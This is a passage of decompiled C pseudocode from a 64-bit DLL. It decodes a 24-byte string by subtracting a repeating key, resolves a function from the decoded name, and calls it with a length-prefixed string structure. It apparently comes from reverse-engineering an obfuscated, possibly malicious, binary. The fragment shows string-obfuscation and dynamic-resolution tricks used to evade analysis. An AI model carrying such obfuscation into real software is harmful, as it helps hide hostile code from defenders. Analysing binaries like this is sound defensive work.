  void (__fastcall *v2)(__int64, _WORD *, _QWORD, __int64 *); // rax
  char v3; // r9
  __int16 v5; // [rsp+8h] [rbp-68h]
  unsigned int v6; // [rsp+Ch] [rbp-64h]
  __int64 v7; // [rsp+18h] [rbp-58h]
  __int64 i; // [rsp+20h] [rbp-50h]
  __int64 v11; // [rsp+38h] [rbp-38h] BYREF
  _WORD v12[4]; // [rsp+40h] [rbp-30h] BYREF
  __int64 v13; // [rsp+48h] [rbp-28h]
  _BYTE v14[32]; // [rsp+50h] [rbp-20h] BYREF

  for ( i = 0; i != 24; ++i )
    v14[i] = byte_1800050E1[i] - byte_18000511A[i & 0xF];
  dword_18009D650 = 9122;
  dword_18009D654 = 3446;
  v7 = 0;
  if ( a2 )
  {
    dword_18009D654 = 4067;
    v2 = (void (__fastcall *)(__int64, _WORD *, _QWORD, __int64 *))sub_180003DB7((__int64)v14);
    dword_18009D654 = 9407;
    v7 = 0;
    if ( v2 )
    {
      v13 = a2;
      dword_18009D650 = 9301;
      v6 = 0;
      do
      {
        v3 = *(_BYTE *)(a2 + v6);
        v5 = v6++;
      }
      while ( v3 );
      v12[0] = v5;
      v12[1] = v5;
      v7 = 0;
      if ( v5 )
      {
        v11 = 0;
        v2(a1, v12, 0, &v11);
        return v11;
      }
    }
  }
  return v7;
}


void  sub_180004892()
{
  BUG();
}


